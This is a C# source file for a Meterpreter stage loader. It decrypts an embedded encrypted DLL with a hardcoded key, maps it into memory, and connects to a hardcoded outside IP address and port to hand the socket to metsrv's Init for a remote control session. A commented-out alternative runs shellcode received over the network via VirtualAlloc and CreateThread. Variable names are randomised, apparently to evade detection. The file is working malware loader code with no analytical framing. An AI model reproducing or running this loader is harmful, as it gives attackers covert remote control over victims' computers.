using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.IO;
using Shared;

namespace MpCsLoader
{
    delegate void MpInit(int df);
    class Program
    {

        static void Main()
        {
            //byte[] dataBuff = null;
            //dataBuff = StageLoader.LoadBinData("192.168.190.52", 4444);
            //StageLoader.ExecuteBin(dataBuff);

            //load dll and m
            // load metsrv.x86.dll, call Init(socketFD)
            //string dll = @"C:\code\Repos\meterpreter\workspace\metsrv\Debug\Win32\metsrv.x86.dll";
            ////Load
            //IntPtr Handle = StageLoader.LoadLibrary(dll);
            //if (Handle == IntPtr.Zero)
            //{
            //    int errorCode = Marshal.GetLastWin32Error();
            //    throw new Exception(string.Format("Failed to load library (ErrorCode: {0})", errorCode));
            //}

            byte[] oldData = MpCsLoader.Properties.Resources.mpenc;
            byte[] dllData = Shared.Encryptor.DecryptData("intelnuc", oldData);

            IntPtr mod = MemoryLibrary.MemoryLoadLibrary(dllData, new string[] { });
            unsafe
            {
                IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
                MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
                int sockfd = StageLoader.LoadBinData("107.170.234.111",1433 );
                func(sockfd);
            }


            

            //StageLoader.Init(sockfd);

            //Free
            //if (Handle != IntPtr.Zero)
            //    StageLoader.FreeLibrary(Handle);
        }

        class StageLoader
        {
            public static int LoadBinData(string YJiGsVcrrhMcL, int kSLthfG)
            {
                IPEndPoint qWQlMKl = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
                Socket svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                try { svrSocket.Connect(qWQlMKl); }
                catch { return 0; }
                byte[] BTexRtLHjsryJ = new byte[4];
                svrSocket.Receive(BTexRtLHjsryJ, 4, 0);
                int RUgJAb = BitConverter.ToInt32(BTexRtLHjsryJ, 0);
                byte[] binBuffer = new byte[RUgJAb + 5];
                int PmUVgiyFcZ = 0;
                while (PmUVgiyFcZ < RUgJAb)
                { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }

                //File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
                
                byte[] socketID = BitConverter.GetBytes((int)svrSocket.Handle);
                Array.Copy(socketID, 0, binBuffer, 1, 4); 
                binBuffer[0] = 0xBF;
                return (int)svrSocket.Handle;
            }
            public static void ExecuteBin(byte[] dataBuff)
            {
                if (dataBuff != null)
                {
                    UInt32 mem = VirtualAlloc(0, (UInt32)dataBuff.Length, 0x1000, 0x40);
                    Marshal.Copy(dataBuff, 0, (IntPtr)(mem), dataBuff.Length);
                    IntPtr rTQFmJBPsbkZae = IntPtr.Zero;
                    UInt32 gVnQhxSchSaCo = 0;
                    IntPtr XtSWbpkcXQGY = IntPtr.Zero;
                    rTQFmJBPsbkZae = CreateThread(0, 0, mem, XtSWbpkcXQGY, 0, ref gVnQhxSchSaCo);
                    WaitForSingleObject(rTQFmJBPsbkZae, 0xFFFFFFFF);
                }
            }

            [DllImport("kernel32")]
            public static extern UInt32 VirtualAlloc(UInt32 bvIYzeDcBlk, UInt32 ydtMqMJH, UInt32 cIxXglgQ, UInt32 TQghYwcy);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(UInt32 baVtjinNDCRtVhs, UInt32 MtpWyF, UInt32 uzxGhQGhcQ, IntPtr xQWffPPns, UInt32 ssZbSBq, ref UInt32 TAjlLVrHZgqQO);

            //[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            //public unsafe static extern uint CreateThread(
            //        uint* lpThreadAttributes,
            //        uint dwStackSize,
            //        UInt32 lpStartAddress,
            //        uint* lpParameter,
            //        uint dwCreationFlags,
            //        out uint lpThreadId);


            [DllImport("kernel32")]
            public static extern UInt32 WaitForSingleObject(IntPtr IQcUPNSyJuQRP, UInt32 pkoRXd);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr LoadLibrary(string libname);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern bool FreeLibrary(IntPtr hModule);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("metsrv.x86.dll")]
            public static extern void Init(int fd);

        }
    }
}
